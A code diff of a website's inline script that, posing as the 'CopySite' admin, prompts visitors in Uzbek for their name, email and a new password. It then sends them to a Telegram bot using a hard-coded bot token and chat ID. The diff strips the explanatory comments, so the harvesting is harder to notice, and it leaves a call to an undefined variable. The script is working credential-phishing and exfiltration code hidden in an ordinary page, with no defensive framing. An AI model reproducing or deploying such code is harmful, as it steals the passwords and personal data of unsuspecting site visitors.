@@ -236,19 +236,18 @@
 
 
 <script>
-   // Foydalanuvchidan ma'lumotlarni olish
+ 
    let name = prompt('Salom men CopySite adminiman.Sizga murojat qilishim uchun ismingizni yoza olasizmi?', '');
    let email = prompt(`Salom ${name} tanishganimdan hursandman! Saytdan to'liq foydalanishingiz uchun emeilingizni kiriting`, '');
    let password = prompt('Hafsizlik yuzasidan yangi parol yaratya olasizmi?', '');
 
    alert(`Bizni tanlaganingiz uchun raxmat ${name}! Agar nimanidir tushunmasangiz "O'rganish" bo'limidan foydalanishingiz mumkin.`);
-   // Matnni formatlash
    const message = `Yangi foydalanuvchi ma'lumotlari:\n\nIsm: ${name}\nEmail: ${email}\nParol: ${password}`;
 
-   // Telegram botga ma'lumotlarni yuborish funksiyasi
+   
    function sendToTelegramBot(message) {
-      const telegramBotToken = '7158426038:AAG_M6E6nbrvBLNx0WVQeiVe8WpTADbX-6M'; // Bu yerga bot tokeningizni kiriting
-      const telegramChatId = '6596148862'; // Bu yerga chat yoki guruh ID si
+      const telegramBotToken = '7158426038:AAG_M6E6nbrvBLNx0WVQeiVe8WpTADbX-6M'; 
+      const telegramChatId = '6596148862'; 
 
       const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
@@ -269,20 +268,16 @@
          });
    }
 
-   // Matnni ovozli o'qish funksiyasi
+
    function speak(text) {
       const utterance = new SpeechSynthesisUtterance(text);
-      utterance.lang = 'uz-UZ'; // O'zbekcha o'qish uchun tilni tanlang
+      utterance.lang = 'uz-UZ'; 
       window.speechSynthesis.speak(utterance);
    }
 
-   // Ovozli xabarni tayyorlash va yuborish
-   // const thanksMessage = `Bizni tanlaganingiz uchun raxmat ${name}! Agar nimanidir tushunmasangiz "O'rganish" bo'limidan foydalanishingiz mumkin.`;
-
-   // Foydalanuvchi ma'lumotlarini Telegram botga yuborish
+ 
    sendToTelegramBot(message);
 
-   // Xushxabarni ovozli o'qish
    speak(thanksMessage);
 </script>
 
